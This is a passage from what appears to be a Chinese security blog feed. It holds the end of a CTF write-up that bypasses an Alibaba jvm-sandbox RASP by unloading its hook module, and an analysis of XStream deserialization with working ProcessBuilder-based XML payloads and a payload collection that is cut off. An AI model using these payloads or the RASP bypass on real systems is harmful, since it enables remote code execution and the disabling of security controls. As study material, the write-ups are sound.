class="hljs-string">&quot;;cfg=%s;system_module=%s;mode=%s;sandbox_home=%s;user_module=%s;provider=%s;namespace=%s;&quot;</span>, getSandboxCfgPath(sandboxHome), getSandboxModulePath(sandboxHome), LAUNCH_MODE, sandboxHome, SANDBOX_USER_MODULE_PATH, getSandboxProviderPath(sandboxHome), getNamespace(featureMap)));  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.ip&quot;</span>, <span class="hljs-string">&quot;0.0.0.0&quot;</span>);  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.port&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);  <br>        <span class="hljs-keyword">return</span> featureSB.toString();  <br>    &#125;  <br><br>    <span class="hljs-keyword">static</span> &#123;  <br>        SANDBOX_USER_MODULE_PATH = DEFAULT_SANDBOX_HOME + File.separator + <span class="hljs-string">&quot;sandbox-module&quot;</span>;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> System.getProperties().getProperty(<span class="hljs-string">&quot;user.home&quot;</span>);  <br>        RESULT_FILE_PATH = var10000 + File.separator + <span class="hljs-string">&quot;.sandbox.token&quot;</span>;  <br>        sandboxClassLoaderMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>();  <br>        OS = System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这个沙箱是阿里云的一个sandbox项目，项目地址：<a href="https://github.com/alibaba/jvm-sandbox">https://github.com/alibaba/jvm-sandbox</a></p><p>其中他是有一个卸载沙箱的操作的，这是官方给出的卸载命令</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">./sandbox.sh -p 33342 -S<br>jvm-sandbox[default] shutdown finished.<br></code></pre></td></tr></table></figure><p>这题看了各个文章，他们的做法也都是直接卸载rasp沙箱来实现绕过，有段更详细的卸载操作在他的.sh脚本文件里面，我们可以直接将他的脚本粘贴过去问一下gpt它是如何卸载的</p><p><img src="https://cdn.clown2024.cn/image-20241111220208835.png" alt="image-20241111220208835"></p><p>这里有个-u可以卸载指定模块</p><p>它里面的具体操作是调用一个<code>sandbox_curl_with_exit</code>函数发起请求到沙箱服务器来执行卸载模块的操作，官方脚本示例如下</p><p><img src="https://cdn.clown2024.cn/image-20241111222729536.png" alt="image-20241111222729536"></p><p>那么我们就可以通过直接请求对应的url来进行模块的卸载，那么rasp监听的是哪个端口呢，这个我们去看rasp的log就能知道了</p><p>查看日志</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;file:///home/ctf/logs/sandbox/sandbox.log&quot;</span>);<br>            java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> url.openStream();<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>            bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[inputStream.available()];<br>            inputStream.read(bytes);<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));<br>            System.out.println(java.util.Base64.getEncoder().encodeToString(bytes));<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>那么我们就可以写一个请求代码去请求本地的rasp接口然后卸载模块：<a href="http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&ids=rasp-rce-native-hook">http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:&lt;port&gt;/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook&quot;</span>);<br>            java.net.<span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (java.net.HttpURLConnection) url.openConnection();<br>            connection.setRequestMethod(<span class="hljs-string">&quot;GET&quot;</span>);<br>            connection.setUseCaches(<span class="hljs-literal">false</span>);<br>            connection.setConnectTimeout(<span class="hljs-number">5000</span>); <span class="hljs-comment">// 5 seconds</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>            java.lang.System.out.println(<span class="hljs-string">&quot;Response Code : &quot;</span> + responseCode);<br>            <span class="hljs-keyword">if</span> (responseCode == java.net.HttpURLConnection.HTTP_OK) &#123;<br>                java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> connection.getInputStream();<br>                java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">inputStreamReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(inputStream);<br>                java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(inputStreamReader);<br><br>                java.lang.String output;<br>                java.lang.<span class="hljs-type">StringBuffer</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.StringBuffer();<br>                <span class="hljs-keyword">while</span> ((output = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    response.append(output);<br>                &#125;<br>                bufferedReader.close();<br>                inputStreamReader.close();<br>                inputStream.close();<br>                connection.disconnect();<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Response Body: &quot;</span> + response.toString());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Request failed!&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (java.net.MalformedURLException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>然后就可以执行任意代码了，至于我们需要卸载的模块名称在日志里面也是能看到的，日志的路径也可以在项目的logback.xml中看到</p><p><img src="https://cdn.clown2024.cn/image-20241111223601498.png" alt="image-20241111223601498"></p><p>卸载完之后就能执行任意代码了</p><p><strong>直接调用uninstall来卸载模块</strong></p><p>还可以直接根据前面的源码知道他又uninstall方法可以用来卸载模块，就可以直接写恶意代码来卸载模块</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// 使用类加载器动态加载 AgentLauncher 类</span><br>            Class&lt;?&gt; agentLauncherClass = Class.forName(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.agent.AgentLauncher&quot;</span>);<br><br>            <span class="hljs-comment">// 获取 uninstall 方法</span><br>System.out.println(agentLauncherClass);<br><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span>Thread.currentThread().getStackTrace()[<span class="hljs-number">1</span>].getClassName();<br>System.out.println(<span class="hljs-string">&quot;当前类名: &quot;</span> + className);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">uninstallMethod</span> <span class="hljs-operator">=</span> agentLauncherClass.getDeclaredMethod(<span class="hljs-string">&quot;uninstall&quot;</span>, String.class);<br><br>uninstallMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;default&quot;</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Sandbox 卸载成功！&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;调用卸载方法时出错: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><a href="https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html">https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html</a></p><p><strong>强网拟态的文章</strong></p><p><a href="https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo+CfoY5D=eQh4he+D">https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo%2BCfoY5D%3DeQh4he%2BD</a></p><p><a href="https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup">https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/84">https://blog.wm-team.cn/index.php/archives/84</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;rasp介绍&quot;&gt;&lt;a href=&quot;#RASP介绍&quot; class=&quot;headerlink&quot; title=&quot;RASP介绍&quot;&gt;&lt;/a&gt;RASP介绍&lt;/h1&gt;&lt;p&gt;RASP全称是Runtime applicaion self-protection，在2014念提出的一种应</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化</title>
    <link href="https://clowsman.github.io/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-11-03T16:13:50.000Z</published>
    <updated>2024-11-06T07:41:39.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xstream介绍"><a href="#XStream介绍" class="headerlink" title="XStream介绍"></a>XStream介绍</h1><p>XStream是一个简单的基于Java库，能够将Java对象和xml文档之间进行相互转换</p><h1 id="反序列化原因"><a href="#反序列化原因" class="headerlink" title="反序列化原因"></a>反序列化原因</h1><p>XStream实现了一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换。</p><p>XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；</p><p>利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p><h1 id="相关类介绍"><a href="#相关类介绍" class="headerlink" title="相关类介绍"></a>相关类介绍</h1><h2 id="eventhandler类"><a href="#EventHandler类" class="headerlink" title="EventHandler类"></a>EventHandler类</h2><p>EventHandler是一个实现了InvocationHandler接口的类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接</p><p><img src="https://cdn.clown2024.cn/image-20241104142648830.png" alt="image-20241104142648830"></p><p>EventHandler的类中有target和action属性，在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()的函数调用链中，会将这两个属性作为类方法和参数继续反射调用</p><p><img src="https://cdn.clown2024.cn/image-20241104143224758.png" alt="image-20241104143224758"></p><p><img src="https://cdn.clown2024.cn/image-20241104143340622.png" alt="image-20241104143340622"></p><h2 id="converter转换器"><a href="#Converter转换器" class="headerlink" title="Converter转换器"></a>Converter转换器</h2><p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。</p><p><img src="https://cdn.clown2024.cn/image-20241104143603604.png" alt="image-20241104143603604"></p><p>我看y4师傅的文章中说转换器需要实现三个方法：</p><ul><li>canConvert方法：告诉XStream对象，它能够转换的对象；</li><li>marshal方法：能够将对象转换为XML时候的具体操作；</li><li>unmarshal方法：能够将XML转换为对象时的具体操作；</li></ul><p>但我在1.4.10版本中只需要实现两种方法即可</p><p>XStream的api文档：<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>使用一下看看转换出来的xml长什么样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span>&#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> age, String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">clown</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">150</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> xStream.toXML(clown);<br>        System.out.println(xml);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>150<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>clown<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>这里就分析几个利用链，因为XStream的cve比较多，而且适用的版本也不一样，就跟着y4师傅分析其文章中的两个利用链</p><p>转化xml的demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>);<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DomDriver</span>());<br>        xStream.fromXML(fileInputStream);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted-set"></a>sorted-set</h2><p>这是一个CVE-2013-7258远程代码执行漏洞</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.4.5，1.4.6或1.4.10，我这里用1.4.10版本来实验</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241104145857536.png" alt="image-20241104145857536"></p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>我们可以从报错的调用栈中开始入手分析，能看出其大致的调用链流程</p><p><img src="https://cdn.clown2024.cn/image-20241106085613877.png" alt="image-20241106085613877"></p><p>其在AbstractTreeMarshallingStrategy#unmarshal调用了TreeUnmarshaller#start方法，从这里开始解析xml内容</p><p><img src="https://cdn.clown2024.cn/image-20241106090828942.png" alt="image-20241106090828942"></p><p>这里会调用HierarchicalStreams#readClassType()来获取到PoC XML中根标签的类类型</p><p>紧接着一路往下跟进</p><p><img src="https://cdn.clown2024.cn/image-20241106091233168.png" alt="image-20241106091233168"></p><p>其最终在com.thoughtworks.xstream.mapper.ClassAliasingMapper#realClass中找到了SortedSet类名，nameToType是一个hashMap类型变量</p><p>回到前面，这里拿到type之后就去调用convertAnother方法来对返回的type进行类型转化</p><p><img src="https://cdn.clown2024.cn/image-20241106092001977.png" alt="image-20241106092001977"></p><p>该方法内部就涉及到convertor转换器的使用，跟进去看看</p><p><img src="https://cdn.clown2024.cn/image-20241106092354449.png" alt="image-20241106092354449"></p><p>其中调用mapper.defaultImplementationOf()函数来寻找java.util.SortedSet类型的默认实现类型进行替换，这里转换为了java.util.TreeSet类型</p><p>然后就是调用converterLookup.lookupConverterForType方法来寻找TreeSet对应的类型转换器</p><p><img src="https://cdn.clown2024.cn/image-20241106093118079.png" alt="image-20241106093118079"></p><p>该方法里面就是获取迭代器对象，然后找到TreeSet对应的类型转化器就返回</p><p>返回之后就是调用convert进行类型转换，调用到AbstractReferenceUnmarshaller#convert方法</p><p><img src="https://cdn.clown2024.cn/image-20241106094933449.png" alt="image-20241106094933449"></p><p>会跳过前面的if-else判断，最后进到else里面，调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中，key的结构如下</p><p><img src="https://cdn.clown2024.cn/image-20241106095218106.png" alt="image-20241106095218106"></p><p>然后调用其父类的convert方法，在里面push到FastStack的堆栈中</p><p><img src="https://cdn.clown2024.cn/image-20241106103638037.png" alt="image-20241106103638037"></p><p>然后就是调用TreeSetConvert的unmarshal方法，继续跟进到一个填充treeMap的TreeMapConverter#populateTreeMap方法</p><p><img src="https://cdn.clown2024.cn/image-20241106105027698.png" alt="image-20241106105027698"></p><p>这里先判断是否是第一个元素，是的话就调用putCurrentEntryIntoMap()函数，即将当前内容填充到Map中</p><p><img src="https://cdn.clown2024.cn/image-20241106105249406.png" alt="image-20241106105249406"></p><p>里面调用readItem()函数读取标签内的内容并缓存到target这个Map中，跟进去直到com.thoughtworks.xstream.mapper.CachingMapper#realClass</p><p><img src="https://cdn.clown2024.cn/image-20241106105555385.png" alt="image-20241106105555385"></p><p>这里就会去寻找dynamic-proxy所对应的类，一路跟进，其寻找的流程和前面的类似</p><p><img src="https://cdn.clown2024.cn/image-20241106110001573.png" alt="image-20241106110001573"></p><p>最后是找到了DynamicProxy这个类</p><p>然后回到readItem方法</p><p><img src="https://cdn.clown2024.cn/image-20241106110155902.png" alt="image-20241106110155902"></p><p>获取到type之后，就去调用convertAnother方法，和前面一样去找类型转换器</p><p><img src="https://cdn.clown2024.cn/image-20241106110438659.png" alt="image-20241106110438659"></p><p>之后也是差不多的流程，一直到下面这个关键的地方，com.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshal方法内部</p><p><img src="https://cdn.clown2024.cn/image-20241106110843531.png" alt="image-20241106110843531"></p><p>这里按标签内容生成对应接口的动态代理，此时这个DUMMY是一个空的代理实现</p><p><img src="https://cdn.clown2024.cn/image-20241106113729142.png" alt="image-20241106113729142"></p><p>继续往下执行handler &#x3D; (InvocationHandler)context.convertAnother(proxy, handlerType);</p><p><img src="https://cdn.clown2024.cn/image-20241106113843979.png" alt="image-20241106113843979"></p><p>然后又是调用相关转换器最终得到EventHandler</p><p><img src="https://cdn.clown2024.cn/image-20241106114015121.png" alt="image-20241106114015121"></p><p>然后后面又是循环得读取标签获取对应得类和内容</p><p>回到前面获取handler的地方，再往下就是替换代理</p><p><img src="https://cdn.clown2024.cn/image-20241106114840135.png" alt="image-20241106114840135"></p><p>然后再回到前面的TreeMapConverter#populateTreeMap，这里会把结果把存到result</p><p><img src="https://cdn.clown2024.cn/image-20241106115157218.png" alt="image-20241106115157218"></p><p>这里的result就是TreeMap，然后里面就会触发我们的动态代理方法了</p><p>因为我们的xml配置代理的接口是Comparable，然后TreeMap在调用putAll方法的时候，会调用到put方法，而里面调用了compare方法</p><p><img src="https://cdn.clown2024.cn/image-20241106121046532.png" alt="image-20241106121046532"></p><p>最终就会走到EventHandler#invokeInternal方法里面，然后反射调用ProcessBuilder的start方法触发命令执行</p><p><img src="https://cdn.clown2024.cn/image-20241106121145638.png" alt="image-20241106121145638"></p><h3 id="其他说明"><a href="#其他说明" class="headerlink" title="其他说明"></a>其他说明</h3><p>在小于等于1.3.1版本，运行报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用</p><p><strong>1.4.1-1.4.4无法触发的原因</strong></p><p>在TreeSetConverter.unmarshal()中，只有当sortedMapField和treeMap不为null时，才能进入populateTreeMap()</p><p><img src="https://cdn.clown2024.cn/image-20241106122009384.png" alt="image-20241106122009384"></p><p>而1.4.1-1.4.4版本中，sortedMapField默认为null</p><p><img src="https://cdn.clown2024.cn/image-20241106122129571.png" alt="image-20241106122129571"></p><p><strong>1.4.7-1.4.9无法触发的原因</strong></p><p>ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤</p><h2 id="tree-map"><a href="#tree-map" class="headerlink" title="tree-map"></a>tree-map</h2><h3 id="影响版本"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>版本&lt;&#x3D;1.4.6或&#x3D;1.4.10</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">tree-map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>good<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tree-map</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="流程说明"><a href="#流程说明" class="headerlink" title="流程说明"></a>流程说明</h3><p>这里其实就和sorted的过程是差不多的，就不做过多的分析了</p><p>他和sorted-set的区别就是在TreeMapConverter#unmarshal的地方</p><p><img src="https://cdn.clown2024.cn/image-20241106141841502.png" alt="image-20241106141841502"></p><p>可以看到没有TreeSetConverter那么多的限制</p><p>主要还是记一下payload以及使用版本，以及后面也是只收集一些CVE的payload</p><h3 id="其他说明"><a href="#其他说明-1" class="headerlink" title="其他说明"></a>其他说明</h3><p><strong>在&lt;&#x3D;1.3.1版本</strong></p><p>会报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用，与sorted-set原因一样</p><p><strong>1.4.7-1.4.9版本</strong></p><p>ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤</p><h1 id="payload收集"><a href="#payload收集" class="headerlink" title="payload收集"></a>payload收集</h1><h2 id="cve-2020-26217远程代码执行漏洞"><a href="#CVE-2020-26217远程代码执行漏洞" class="headerlink" title="CVE-2020-26217远程代码执行漏洞"></a>CVE-2020-26217远程代码执行漏洞</h2><p>影响版本&lt;&#x3D;1.4.13</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span 